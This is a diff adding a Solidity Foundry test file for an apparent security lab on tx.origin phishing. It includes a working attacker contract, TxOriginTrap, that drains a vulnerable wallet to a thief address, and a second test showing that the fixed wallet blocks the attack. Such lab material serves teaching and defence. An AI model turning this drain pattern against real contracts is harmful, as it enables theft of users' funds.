@@ -1,0 +1,6 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
+import {Test} from "forge-std/Test.sol";import {TxOriginWallet} from "../src/vulnerable/TxOriginWallet.sol";import {TxOriginWalletFixed} from "../src/fixed/TxOriginWalletFixed.sol";
+interface IWalletTransfer {function transfer(address payable,uint256) external;}
+contract TxOriginTrap {IWalletTransfer public wallet;address payable public thief;constructor(address w,address payable t){wallet=IWalletTransfer(w);thief=t;}function trick() external{wallet.transfer(thief,address(address(wallet)).balance);}}
+contract TxOriginLabTest is Test {address owner=makeAddr("owner");address thief=makeAddr("thief");function test_Exploit_Phishing() public {vm.deal(owner,3 ether);vm.prank(owner);TxOriginWallet w=new TxOriginWallet{value:2 ether}();TxOriginTrap trap=new TxOriginTrap(address(w),payable(thief));vm.prank(owner,owner);trap.trick();assertEq(address(w).balance,0);assertEq(thief.balance,2 ether);}function test_Fixed_PhishingBlocked() public {vm.deal(owner,3 ether);vm.prank(owner);TxOriginWalletFixed w=new TxOriginWalletFixed{value:2 ether}();TxOriginTrap trap=new TxOriginTrap(address(w),payable(thief));vm.prank(owner,owner);vm.expectRevert(bytes("not owner"));trap.trick();assertEq(address(w).balance,2 ether);}}
